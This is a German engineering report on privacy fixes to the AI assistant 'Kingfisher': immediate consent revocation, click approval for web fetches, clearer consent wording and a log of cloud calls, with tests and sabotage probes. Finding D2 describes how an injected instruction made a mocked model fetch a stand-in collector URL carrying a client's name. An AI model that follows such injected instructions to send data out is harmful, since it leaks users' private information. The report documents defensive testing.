# Befunde der Persona-Prüfung, Paket D: Datenschutz (26.10.2026)

Grundlage: [Persona-Prüfung 1.0.29](../2026-10-26-persona-pruefung/README.md), Befunde D1 bis D6 und die Kleinpunkte des
Anwalts. D7 (Löschen und Export je Person, Wiederherstellen der Sicherung) gehört nicht in dieses Paket.

Nachgestellt mit einer Kopie der Anwalt-Persona (echter Sidecar, gebaute Oberfläche, Messlatte-Welt „Lea Hartmann“,
Netzwache: jede Verbindung nach draußen wird festgehalten und abgelehnt, Cloud-Attrappe mit einstellbarer Verzögerung).
Nur synthetische Daten, kein echter Cloud-Aufruf. Chromium unter Linux, 1280 und 390 px, hell und ein Bild dunkel.

## Je Befund

### D1 Widerruf sofort wirksam

- **Vorher:** Cloud-Attrappe mit 6 s je Anfrage, Frage gestellt, nach 2 s im zweiten Fenster ausgeschaltet. Der Schalter
  stand 12 s auf „an“, zwei Anfragen gingen nach dem Widerruf noch hinaus (Bild der Persona:
  [anwalt-widerruf-wartet.jpg](../2026-10-26-persona-pruefung/anwalt-widerruf-wartet.jpg)).
- **Ursache:** `PUT /api/v1/models/roles/{rolle}` schrieb unter der Gesprächssperre, die die laufende Antwort bis zum Ende
  hält. Der Widerruf kam also erst an, als die Antwort fertig war; bis dahin lasen alle Prüfungen „Einwilligung gilt“.
  Zweitens prüfte der Gesprächsweg (`Agent.send`) die Einwilligung vor seinen Runden gar nicht, nur der Gedächtnisweg.
- **Behebung:** Ein Widerruf nimmt die Sperre nicht und schreibt sofort (neues Wörterbuch statt Änderung am gelesenen);
  alles, was erweitert, wartet wie bisher. Jeder einzelne Versand an einen Anbieter aus einer Einwilligung prüft sie frisch:
  Gespräch vor jeder Runde, auch nach einem Werkzeug (`Agent._cloud_vor_versand`), Fragen verstehen (Rolle `frage`),
  Gedächtnis (wie bisher), Einordnung neuer Mails (wie bisher, je Aufruf). Nach dem Widerruf steht im Gespräch „Die Cloud
  ist ausgeschaltet. Ab hier ist nichts mehr an den Anbieter gegangen.“ Der Schalter steht beim Klick auf „aus“, beide
  Aufgaben werden zugleich widerrufen.
- **Nachher:** dieselbe Probe: Schalter nach 1 s und dauerhaft „aus“, **0 Anfragen nach dem Widerruf** (vorher 2), die
  Antwort fällt auf die wörtlichen Belege zurück. Bild: [d1-nachher-widerruf-sofort.jpg](d1-nachher-widerruf-sofort.jpg).
- **Tests:** `test_widerruf_wartet_nicht_auf_eine_laufende_antwort`, `test_einschalten_wartet_weiter_…`,
  `test_widerruf_zwischen_zwei_werkzeugrunden_sendet_nichts_mehr` (Attrappe zählt: 1 Anfrage vor, 0 nach dem Widerruf),
  `test_gespraech_ohne_gueltige_einwilligung_sendet_keine_einzige_anfrage` (6 Fälle),
  `test_fragen_verstehen_prueft_die_einwilligung_vor_dem_versand` (alle in `sidecar/tests/test_datenschutz_paket_d.py`).

### D2 Webabruf nur mit sichtbarer Freigabe

- **Vorher:** Eine eingeschleuste Anweisung ließ die Cloud-Attrappe `web_abruf` auf
  `https://sammler.example/?mandant=Kreisklinik+Rheingau` rufen; der Abruf lief ohne Freigabe und ohne Spur in der
  Oberfläche (Netzwache: DNS-Anfrage an `sammler.example`). Bild: [d2-vorher-abruf-ohne-freigabe.jpg](d2-vorher-abruf-ohne-freigabe.jpg).
- **Ursache:** `web_abruf` ist `ActionClass.READ`, Vorgabe `AUTO`; nur in einer Runde mit fremdem Inhalt hob die Policy auf
  die genaue Freigabe.
- **Behebung:** `Policy._IMMER_FREIGABE`: ein Webabruf braucht mindestens `CONFIRM` (ein Klick), auch eine Dauerregel senkt
  das nicht. Die Karte sagt in einem Satz die Adresse, wer die IP-Adresse sieht und welche Angaben mit der Adresse
  hinausgehen (`tools.web_abruf_satz`). Nach dem Klick bleibt die Karte mit „Freigegeben“ im Gespräch stehen. **Bewusst
  beibehalten:** In einer Runde mit fremdem Inhalt bleibt die genaue Freigabe (Adresse abtippen). Dort kann die Adresse von
  der fremden Quelle diktiert sein; das ist eine bestehende Sicherheitszusage, und Kontrolle geht vor Einfachheit. Neuer
  Schalter „Webseiten im Gespräch abrufen“ unter „Was Kingfisher darf“ (Vorgabe an, weil jeder Abruf ohnehin gefragt wird;
  aus: das Modell bekommt das Werkzeug nicht).
- **Nachher:** Freigabekarte vor jedem Abruf, Netzwache leer bis zum Klick. Bilder: [d2-nachher-freigabe.jpg](d2-nachher-freigabe.jpg),
  [d2-nachher-abgerufen.jpg](d2-nachher-abgerufen.jpg).
- **Tests:** `test_webabruf_braucht_immer_eine_freigabe_mit_einem_klick`, `test_die_freigabe_nennt_adresse_ip_und_mitgesendete_angaben`,
  `test_webabruf_im_gespraech_wartet_auf_die_freigabe`, `test_webabruf_laesst_sich_unter_was_kingfisher_darf_ausschalten`;
  angepasst (sie hielten das alte Verhalten fest): `test_memory_agent_boundary.py::test_clean_explicit_web_read_countercase`,
  `::test_explicit_reset_discards_history_for_clean_countercase`, `test_security.py::test_prompt_injection_kette`.

**Weitere Wege nach draußen, ehrlich gelistet.** Unter „Was Kingfisher darf“ stehen jetzt: Wetter (Open-Meteo, auch die
Ortssuche), Welt-Meldungen, Wegezeit, Cloud für Fragen und Antworten, Cloud-Einordnung, Webabruf, Update-Prüfung,
Firmenbilder und Onlinekarte (Kartenkacheln von OpenStreetMap, aus dem Browser). Nicht dort, mit Grund:

| Weg | Wo er steht | Wann |
|---|---|---|
| Postfächer, Kalender, Kalender-Abo, Microsoft, Google | Zugänge | die Funktion selbst |
| Mailserver der eigenen Domain suchen (DNS: SRV, MX; `autoconfig.<domain>`) | Zugänge, beim Eintippen der Adresse | nur die Domain |
| Anmelden bei Google, Microsoft, ChatGPT | Zugänge, KI & Modelle | nach Klick |
| Modelle laden (Ollama lädt von ollama.com) | KI & Modelle | nach Bestätigung |
| Gedächtnis aus der Cloud aufbauen (Claude, ChatGPT) | KI & Modelle | eigene Einwilligung; jetzt im Cloud-Protokoll |
| „Weitere öffentliche Quellen“ | Für Techniker | von Hand oder nach Zeitplan; **offen:** gehört nach vorn |
| „Zugang testen“ (ein Satz „bereit“ an den Anbieter) | Einrichtung | nach Klick |

### D3 Update-Prüfung

- **Vorher:** an, 60 s nach dem Start ein Abruf bei `icarus-health.github.io`; der Schalter stand unter „Kingfisher und du“
  mit „Über dich geht dabei nichts hinaus.“, unter „Speicherorte“ hieß es, nichts verlasse den Rechner außer dem unter
  „Was Kingfisher darf“ Eingeschalteten. Bilder: [d3-vorher-darf-390.jpg](d3-vorher-darf-390.jpg), [d3-vorher-speicherorte.jpg](d3-vorher-speicherorte.jpg).
- **Behebung:** Schalter „Nach neuen Fassungen sehen“ unter „Was Kingfisher darf“: „Es verlässt nur eine Abfrage den
  Rechner: Einmal am Tag ruft Kingfisher bei GitHub eine kleine Datei ab, die die neueste Fassung nennt; GitHub sieht dabei
  deine IP-Adresse. Aus: Du erfährst nicht mehr von selbst von Sicherheitsupdates.“ Unter „Kingfisher und du“ bleiben
  Fassung und „Jetzt nachsehen“. „Speicherorte“ und die Fußnote nennen die Ausnahme.
- **Vorgabe: an.** Prüffrage 6 („Ist die Vorgabe die richtige?“): Die meisten ändern nichts. Mit „aus“ erführe fast niemand
  von einem Sicherheitsupdate; abgerufen wird eine öffentliche Datei ohne Keks und Kennung, und der einzige Preis, die
  IP-Adresse bei GitHub, steht jetzt sichtbar da und ist mit einem Klick abzuschalten.
- **Nachher:** [d3-nachher-darf-390.jpg](d3-nachher-darf-390.jpg), [d3-nachher-speicherorte.jpg](d3-nachher-speicherorte.jpg).
- **Tests:** `fassung.test.mjs` (Satz, Ort des Schalters), `zusagen-nach-kuerzen.test.mjs` (Speicherorte), Browserprobe
  `scripts/probe_fassung_ui.py` an den neuen Ort angepasst und grün.

### D4 Einwilligung nennt Anbieter, Land und Inhalte / D5 Schalter erst nach Zustimmung an

- **Vorher:** „… an den Cloudanbieter, den du gewählt hast …“ und „Textstellen“; der Schalter sprang beim Öffnen der Frage
  auf „an“ (`an={an || frage}`). Bild: [d4-d5-vorher-zustimmung.jpg](d4-d5-vorher-zustimmung.jpg).
- **Behebung:** `nach_draussen.ANBIETER` (Name mit Land, Region; nach den datierten Angaben in `cloud_provider_facts.py`),
  geliefert mit `GET /api/v1/models/roles`. Die Zustimmung: „Deine Fragen, der Gesprächsverlauf und Inhalte deiner Mails,
  Termine und Notizen, ganz oder in Auszügen, samt Absender, Betreff und Datum gehen an Anthropic (USA) und werden nicht nur
  in der EU verarbeitet. Das gilt für jede Frage, auch an dein Gedächtnis, bis du den Schalter wieder ausschaltest. Ich
  willige ein.“ Ohne gewählten Anbieter gibt es kein Häkchen, sondern die Bitte zu wählen; ein Anbieterwechsel löscht das
  Häkchen. Dasselbe hinter „Für Techniker“ und im Satz der Rolle im Sidecar. Der Schalter bleibt „aus“, darunter „Noch aus:
  Die Cloud ist erst an, wenn du unten zustimmst.“
- **Nachher:** [d4-d5-nachher-zustimmung.jpg](d4-d5-nachher-zustimmung.jpg), [390 px](d4-d5-nachher-zustimmung-390.jpg).
- **Tests:** `zusagen-nach-kuerzen.test.mjs` erweitert (Inhalte, Anbieter, Land, Region, Dauer, kein „gewählt hast“,
  Schalter), `einstellungen-gliederung.test.mjs`, `test_anbieter_nennen_land_und_region`, `test_einwilligungssatz_…`.

### D6 Hinweis bei langsamer Antwort

- **Behebung:** „Lokal dauert das. Mit der Cloud ginge es in wenigen Sekunden. Dann gingen deine Fragen und Inhalte deiner
  Mails an Anthropic (USA).“ Ist kein oder mehr als ein Anbieter vorbereitet: „… an einen Cloudanbieter, dem du beim
  Einschalten zustimmst.“ Bild: [d6-nachher-langsam.jpg](d6-nachher-langsam.jpg) (aus `scripts/probe_tempo_ui.py`).
- **Tests:** `gespraech-warten.test.mjs`. Dabei behoben: Der Sprung zum Schalter wartete nicht, bis der Schalter geladen
  war, und der danach längere Abschnitt rutschte aus dem Fenster (Probe rot); jetzt sucht er den geladenen Schalter.

### Kleinpunkte

- **(a)** Gesprächsantworten aus der Cloud tragen „Über Anthropic beantwortet.“ (`context.cloud_antwort`), wie
  Gedächtnisantworten. Sichtbar in [d2-nachher-freigabe.jpg](d2-nachher-freigabe.jpg).
- **(b)** „Was an die Cloud ging“, aufklappbar unter dem Cloud-Schalter: je Anfrage Zeit, Anbieter, wofür, ohne Inhalt
  (Logbuch-Art `cloud_anfrage`, geschrieben unmittelbar vor dem Versand, nach der Prüfung; auch Einordnung und Aufbau aus
  der Cloud). Bilder: [b-nachher-protokoll.jpg](b-nachher-protokoll.jpg), dunkel [b-nachher-darf-dunkel.jpg](b-nachher-darf-dunkel.jpg).
- **(c)** Ohne Netz sagte eine Weltquelle „Diese Adresse ist nicht erlaubt …“, weil die nicht auflösbare Adresse als
  Sicherheitsfehler galt. Jetzt `HostNichtAufloesbar`: „www.deutschlandfunk.de ist gerade nicht erreichbar. Vermutlich
  besteht keine Verbindung zum Internet; …“; interne Ziele und `http` bleiben „nicht erlaubt“. Bilder:
  [vorher](c-vorher-welt-ohne-netz.jpg), [nachher](c-nachher-welt-ohne-netz.jpg).
- **(d)** Wetter, Welt, Wegezeit, Webabruf und Update-Prüfung sagen, dass der Dienst die IP-Adresse sieht.

## Zahlen

- Neue Tests Sidecar: 22 in `test_datenschutz_paket_d.py`; drei bestehende angepasst, einer präzisiert.
- Oberfläche: `node --test` 954 bestanden, `tsc --noEmit` sauber, `vite build` sauber.
- Volle Suite Sidecar: siehe unten.
- `scripts/probe_seiten_ui.py` hell und dunkel: je 75 Breiten geprüft, 0 nicht in Ordnung. `probe_fassung_ui.py` und
  `probe_tempo_ui.py` grün.

## Sabotageproben (15, alle rot, danach grün)

Widerruf wartet wieder auf die Sperre · Gespräch ohne Prüfung je Runde · Fragen verstehen ohne Prüfung · Webabruf ohne
Mindestfreigabe (auch Grenz- und Injektionstest rot) · Freigabesatz ohne mitgesendete Angaben · Webabruf-Schalter
wirkungslos · Protokoll schreibt nichts · Gesprächsantwort ohne Cloudvermerk · ohne Netz wieder „nicht erlaubt“ ·
Anbieter ohne Land · Schalter an bei offener Zustimmung · „den du gewählt hast“ zurück · Update-Satz „Über dich geht nichts
hinaus“ zurück · Langsam-Hinweis ohne Empfänger · kein Cloudvermerk in der Oberfläche.

## Grenzen

- „Weitere öffentliche Quellen“ (Für Techniker) ruft nach Zeitplan ab und steht nicht unter „Was Kingfisher darf“.
- Ein Standardanbieter aus der Umgebung (`ICARUS_PROVIDER`, ohne Rolleneinwilligung) wird im Gespräch weiter benutzt, wie
  bisher; er steht jetzt im Protokoll und trägt den Cloudvermerk, braucht aber keine Einwilligung im Schalter.
- Eine Gedächtnisantwort, die durch den Widerruf auf wörtliche Belege zurückfällt, sagt das nicht eigens.
- Länder und Regionen der Anbieter sind datierte Angaben (19.10.2026), keine rechtliche Zusicherung.
- Linux-Chromium statt Mac-App; Cloud, Netz und Modelle als Attrappen.
